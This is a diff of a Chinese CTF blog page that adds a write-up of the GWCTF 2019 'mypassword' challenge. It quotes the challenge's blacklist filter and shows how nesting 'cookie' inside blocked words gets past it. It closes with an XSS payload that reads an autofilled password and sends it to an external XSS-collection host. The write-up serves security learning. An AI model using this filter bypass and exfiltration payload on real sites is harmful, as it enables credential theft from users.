@@ -82,14 +82,16 @@
 
 
 
-<meta name="description" content="CISCN 2019 华东北赛区 web2 注册登录， 有投稿和反馈功能， 投个稿试试  投完可以看自己的稿件， 发现没有触发， 看看什么情况 1&amp;lt;meta http-equiv=&amp;quot;content-security-policy&amp;quot; content=&amp;quot;default-src &amp;apos;self&amp;apos;; script-src &amp;apos;unsafe-inl">
+<meta name="description" content="GWCTF 2019 mypassword  真的要好好看源码, 好好看network 请求了什么资源, 好好看响应头, 总之仔细看控制台中的信息  首先是个登录注册界面, login.php没啥特别的, 看看login.js  12345678910111213if (document.cookie &amp;amp;&amp;amp; document.cookie != &apos;&apos;) &amp;#123;	var coo">
 <meta name="keywords" content="CTF WEB">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XSS &amp; CSRF 题型记录[working forever]">
 <meta property="og:url" content="http://yoursite.com/2019/04/22/XSS题型记录/index.html">
 <meta property="og:site_name" content="CH4SER || 自闭室">
-<meta property="og:description" content="CISCN 2019 华东北赛区 web2 注册登录， 有投稿和反馈功能， 投个稿试试  投完可以看自己的稿件， 发现没有触发， 看看什么情况 1&amp;lt;meta http-equiv=&amp;quot;content-security-policy&amp;quot; content=&amp;quot;default-src &amp;apos;self&amp;apos;; script-src &amp;apos;unsafe-inl">
+<meta property="og:description" content="GWCTF 2019 mypassword  真的要好好看源码, 好好看network 请求了什么资源, 好好看响应头, 总之仔细看控制台中的信息  首先是个登录注册界面, login.php没啥特别的, 看看login.js  12345678910111213if (document.cookie &amp;amp;&amp;amp; document.cookie != &apos;&apos;) &amp;#123;	var coo">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/images/image-20200209213425033.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20200209213839155.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/70881416-7485b100-2007-11ea-899f-9336636cfc90.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/70881794-aa776500-2008-11ea-8e5c-4b4c7f301b83.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/70883020-a6e5dd00-200c-11ea-8ca6-c711d5728c96.png">
@@ -98,11 +100,11 @@
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/58318343-24b48200-7e4a-11e9-9bed-625dfb6ef869.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/58318897-46facf80-7e4b-11e9-9702-87e89cf4afbe.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/58321041-9c38e000-7e4f-11e9-805d-b0620180836c.png">
-<meta property="og:updated_time" content="2019-12-28T18:11:34.443Z">
+<meta property="og:updated_time" content="2020-02-09T13:44:17.311Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XSS &amp; CSRF 题型记录[working forever]">
-<meta name="twitter:description" content="CISCN 2019 华东北赛区 web2 注册登录， 有投稿和反馈功能， 投个稿试试  投完可以看自己的稿件， 发现没有触发， 看看什么情况 1&amp;lt;meta http-equiv=&amp;quot;content-security-policy&amp;quot; content=&amp;quot;default-src &amp;apos;self&amp;apos;; script-src &amp;apos;unsafe-inl">
-<meta name="twitter:image" content="https://user-images.githubusercontent.com/40637063/70881416-7485b100-2007-11ea-899f-9336636cfc90.png">
+<meta name="twitter:description" content="GWCTF 2019 mypassword  真的要好好看源码, 好好看network 请求了什么资源, 好好看响应头, 总之仔细看控制台中的信息  首先是个登录注册界面, login.php没啥特别的, 看看login.js  12345678910111213if (document.cookie &amp;amp;&amp;amp; document.cookie != &apos;&apos;) &amp;#123;	var coo">
+<meta name="twitter:image" content="http://yoursite.com/images/image-20200209213425033.png">
 
 
 
@@ -342,8 +344,8 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2019-12-29T02:11:34+08:00">
-                2019-12-29
+              <time title="Post modified" itemprop="dateModified" datetime="2020-02-09T21:44:17+08:00">
+                2020-02-09
               </time>
             
           </span>
@@ -392,7 +394,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  3.5k
+                  4k
                 </span>
               
 
@@ -408,7 +410,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  17
+                  19
                 </span>
               
             </div>
@@ -429,7 +431,25 @@
       
 
       
-        <h2 id="CISCN-2019-华东北赛区-web2">CISCN 2019 华东北赛区 web2</h2>
+        <h2 id="GWCTF-2019-mypassword">GWCTF 2019 mypassword</h2>
+<blockquote>
+<p>真的要好好看源码, 好好看network 请求了什么资源, 好好看响应头, 总之仔细看控制台中的信息</p>
+</blockquote>
+<p>首先是个登录注册界面, login.php没啥特别的, 看看login.js</p>
+<p><img src="/images/image-20200209213425033.png" alt="image-20200209213425033"></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.cookie &amp;&amp; <span class="built_in">document</span>.cookie != <span class="string">''</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie.split(<span class="string">'; '</span>);</span><br><span class="line">	<span class="keyword">var</span> cookie = &#123;&#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; cookies.length; i++) &#123;</span><br><span class="line">		<span class="keyword">var</span> arr = cookies[i].split(<span class="string">'='</span>);</span><br><span class="line">		<span class="keyword">var</span> key = arr[<span class="number">0</span>];</span><br><span class="line">		cookie[key] = arr[<span class="number">1</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">typeof</span>(cookie[<span class="string">'user'</span>]) != <span class="string">"undefined"</span> &amp;&amp; <span class="keyword">typeof</span>(cookie[<span class="string">'psw'</span>]) != <span class="string">"undefined"</span>)&#123;</span><br><span class="line">		<span class="built_in">document</span>.getElementsByName(<span class="string">"username"</span>)[<span class="number">0</span>].value = cookie[<span class="string">'user'</span>];</span><br><span class="line">		<span class="built_in">document</span>.getElementsByName(<span class="string">"password"</span>)[<span class="number">0</span>].value = cookie[<span class="string">'psw'</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>会把当前用户的用户名和密码填进当前的表单中来.</p>
+<p>注册登录进去</p>
+<p><img src="/images/image-20200209213839155.png" alt="image-20200209213839155"></p>
+<p>feedback功能可以给管理员反馈消息, 同时list中可以点看查看和删除消息内容, 一开始还以为删除消息那里有盲注.</p>
+<p>发现feedback.php有注释</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_array($feedback))&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('反馈不合法');&lt;/script&gt;"</span>;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			$blacklist = [<span class="string">'_'</span>,<span class="string">'\''</span>,<span class="string">'&amp;'</span>,<span class="string">'\\'</span>,<span class="string">'#'</span>,<span class="string">'%'</span>,<span class="string">'input'</span>,<span class="string">'script'</span>,<span class="string">'iframe'</span>,<span class="string">'host'</span>,<span class="string">'onload'</span>,<span class="string">'onerror'</span>,<span class="string">'srcdoc'</span>,<span class="string">'location'</span>,<span class="string">'svg'</span>,<span class="string">'form'</span>,<span class="string">'img'</span>,<span class="string">'src'</span>,<span class="string">'getElement'</span>,<span class="string">'document'</span>,<span class="string">'cookie'</span>];</span><br><span class="line">			<span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $val) &#123;</span><br><span class="line">		        <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">		            <span class="keyword">if</span>(stripos($feedback,$val) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">		                $feedback = str_ireplace($val,<span class="string">""</span>,$feedback);</span><br><span class="line">		            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		                <span class="keyword">break</span>;</span><br><span class="line">		            &#125;</span><br><span class="line">		        &#125;</span><br><span class="line">		    &#125;</span><br></pre></td></tr></table></figure>
+<p>不分大小写的不断替换, 但是如果是docucookiement的话, 替换后会剩下document, 这样就可以构造脚本了, 注意到查看消息的页面content.php的返回头中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;;script-src &apos;unsafe-inline&apos; &apos;self&apos;</span><br></pre></td></tr></table></figure>
+<p>允许内联脚本执行, 但是不可以远程请求js脚本执行, 不过已经够了, 把密码发到xss平台就好</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;incookieput type=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt;</span><br><span class="line">&lt;incookieput type=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;</span><br><span class="line">&lt;scrcookieipt scookierc=<span class="string">"./js/login.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">scrcookieipt</span>&gt;</span></span></span><br><span class="line">&lt;scrcookieipt&gt;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="built_in">String</span>.fromCharCode(<span class="number">0x26</span>);</span><br><span class="line">	<span class="keyword">var</span> psw = docucookiement.getcookieElementsByName(<span class="string">"password"</span>)[<span class="number">0</span>].value;</span><br><span class="line">	docucookiement.locacookietion=<span class="string">"http://xss.buuoj.cn/index.php?do=api"</span>+a+<span class="string">"id=uHi9SZ"</span>+a+<span class="string">"location="</span>+psw;</span><br><span class="line">&lt;<span class="regexp">/scrcookieipt&gt;</span></span><br></pre></td></tr></table></figure>
+<p>flag就是密码</p>
+<h2 id="CISCN-2019-华东北赛区-web2">CISCN 2019 华东北赛区 web2</h2>
 <p>注册登录， 有投稿和反馈功能， 投个稿试试</p>
 <p><img src="https://user-images.githubusercontent.com/40637063/70881416-7485b100-2007-11ea-899f-9336636cfc90.png" alt="image"></p>
 <p>投完可以看自己的稿件， 发现没有触发， 看看什么情况</p>
@@ -622,7 +642,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">43</span>
+                  <span class="site-state-item-count">44</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -714,7 +734,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN-2019-华东北赛区-web2"><span class="nav-number">1.</span> <span class="nav-text">CISCN 2019 华东北赛区 web2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web50"><span class="nav-number">2.</span> <span class="nav-text">web50</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#eXquisite-Scenery-Sites-boot2root"><span class="nav-number">3.</span> <span class="nav-text">eXquisite Scenery Sites(boot2root)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Rctf-rblog"><span class="nav-number">4.</span> <span class="nav-text">Rctf rblog</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCTF2019-jails-password"><span class="nav-number">5.</span> <span class="nav-text">RCTF2019 jails &amp;password</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#GWCTF-2019-mypassword"><span class="nav-number">1.</span> <span class="nav-text">GWCTF 2019 mypassword</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN-2019-华东北赛区-web2"><span class="nav-number">2.</span> <span class="nav-text">CISCN 2019 华东北赛区 web2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web50"><span class="nav-number">3.</span> <span class="nav-text">web50</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#eXquisite-Scenery-Sites-boot2root"><span class="nav-number">4.</span> <span class="nav-text">eXquisite Scenery Sites(boot2root)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Rctf-rblog"><span class="nav-number">5.</span> <span class="nav-text">Rctf rblog</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCTF2019-jails-password"><span class="nav-number">6.</span> <span class="nav-text">RCTF2019 jails &amp;password</span></a></li></ol></div>
             
 
           </div>
@@ -748,7 +768,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">73.6k</span>
+    <span title="Site words total count">74.6k</span>
   
 
   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
